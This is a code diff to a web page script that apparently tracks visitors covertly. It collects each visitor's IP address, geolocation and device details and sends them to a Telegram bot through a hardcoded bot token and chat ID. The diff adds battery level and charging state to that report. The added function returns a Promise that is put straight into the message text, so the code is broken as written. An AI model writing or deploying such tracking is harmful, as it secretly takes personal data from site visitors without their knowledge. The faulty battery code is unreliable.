@@ -119,11 +119,12 @@
                         const ip = data.ip || 'Not found';
                         const location = `${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'N/A'}`;
                         const deviceInfo = getDeviceInfo();
-                        sendToTelegram(ip, location, deviceInfo);
+                        const batteryStatus = getBatteryStatus();
+                        sendToTelegram(ip, location, deviceInfo, batteryStatus);
                     })
                     .catch(error => {
                         console.error('Error fetching IP:', error);
-                        sendToTelegram('Unknown', 'Unknown', getDeviceInfo());
+                        sendToTelegram('Unknown', 'Unknown', getDeviceInfo(), 'Battery info not available');
                     });
 
                 setTimeout(() => {
@@ -146,12 +147,22 @@ Screen: ${screenWidth}x${screenHeight}
 Language: ${language}`;
         }
 
-        function sendToTelegram(ip, location, deviceInfo) {
+        function getBatteryStatus() {
+            if (navigator.getBattery) {
+                return navigator.getBattery().then(battery => {
+                    return `Battery: ${battery.level * 100}% | Charging: ${battery.charging ? 'Yes' : 'No'}`;
+                });
+            }
+            return Promise.resolve('Battery info not available');
+        }
+
+        function sendToTelegram(ip, location, deviceInfo, batteryStatus) {
             const token = '8132685114:AAFLul-sqA7Ld5keC7FWdKatu_41hjVHBYM';
             const chatId = '1962244896';
-            const message = `IP Address: ${ip}
-Location: ${location}
-${deviceInfo}`;
+            const message = `📡 IP Address: ${ip}
+📍 Location: ${location}
+💻 ${deviceInfo}
+🔋 ${batteryStatus}`;
 
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                 .then(response => response.json())
